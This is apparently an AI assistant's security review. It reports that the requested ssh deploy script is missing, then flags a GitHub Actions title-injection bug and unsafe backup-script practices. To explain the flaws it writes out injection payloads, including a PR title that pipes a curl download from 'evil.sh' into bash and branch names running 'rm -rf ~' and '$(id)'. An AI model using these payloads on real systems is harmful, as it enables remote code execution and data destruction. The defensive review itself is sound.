I couldn't review the deploy script because it isn't in this workspace. Nothing in the repository contains `ssh`, and nothing mentions a branch name. The closest files are:

- **`.github/workflows/deploy.yml`**: a single `echo` step. It doesn't run `ssh` or deploy anything.
- **`scripts/backup.sh`**: uses `scp` for a nightly backup. It doesn't use a branch name.

Can you send the script itself, or its path if it's in another repo or branch? Meanwhile, two files here have problems that matter before CI runs them.

**`.github/workflows/deploy.yml`: the same kind of bug you described, and worse**
- **Line 14:** `run: echo "Title is ${{ github.event.pull_request.title }}"` puts the pull request title, which an attacker controls, straight into the shell script. GitHub substitutes the text before bash runs, so quoting doesn't help. A title like `"; curl evil.sh | bash; #` runs on the runner. The fix is to pass it through an environment variable: `env: PR_TITLE: ${{ github.event.pull_request.title }}`, then `echo "Title is ${PR_TITLE}"`.
- **Line 7:** `permissions: write-all` gives that injected code a token that can write to the repository. Cut this to `contents: read` and add only what the job actually needs.

**`scripts/backup.sh`**
- It has no `set -Eeuo pipefail`. If `tar` fails, it still copies a partial or missing archive and then deletes the evidence.
- `/tmp/backup.$$` is a predictable path, so another local user can plant a symlink there. Use `mktemp -d` instead, with an `EXIT` trap set up before it for cleanup.
- None of the variables are quoted, and it uses backticks. It also needs a `PATH`, and `umask 077`, because it runs from cron.

**What to check in the ssh script when it arrives**

`ssh host "deploy.sh $BRANCH"` is unsafe however you quote it on your side. ssh joins its arguments into one string, and the remote shell parses that string again. A branch named `x;rm -rf ~` or `$(id)` will run on the server. The fix:
1. **Check the name first:** match it against an allowlist such as `^[A-Za-z0-9._/-]+$`, reject names starting with `-`, and stop if it doesn't match. Reject bad names instead of trying to clean them up.
2. **Quote it for the remote shell:** use `printf -v q '%q' "$branch"; ssh -- "$host" "deploy.sh ${q}"`. Even better, send it on stdin, or use a forced command in `authorized_keys` that reads `SSH_ORIGINAL_COMMAND` and checks it on the server.
3. **In CI, read the branch from an `env:` variable**, never from an inline `${{ }}` expression.

Send the script and I'll review it properly, including running shellcheck, `bash -n`, and a test with a hostile branch name.
